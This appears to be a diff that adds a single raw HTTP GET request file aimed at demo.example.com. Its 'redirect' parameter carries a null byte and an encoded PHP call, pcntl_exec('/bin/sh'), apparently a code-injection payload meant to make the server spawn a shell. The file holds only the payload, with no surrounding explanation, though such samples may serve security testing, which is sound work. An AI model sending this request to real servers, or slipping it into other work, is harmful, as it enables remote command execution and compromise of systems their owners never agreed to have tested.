@@ -1,0 +1,4 @@
+GET /a?redirect=/*%00*/b%3Dpcntl_exec("/bin/sh") HTTP/1.1
+Host: demo.example.com
+Connection: close
+
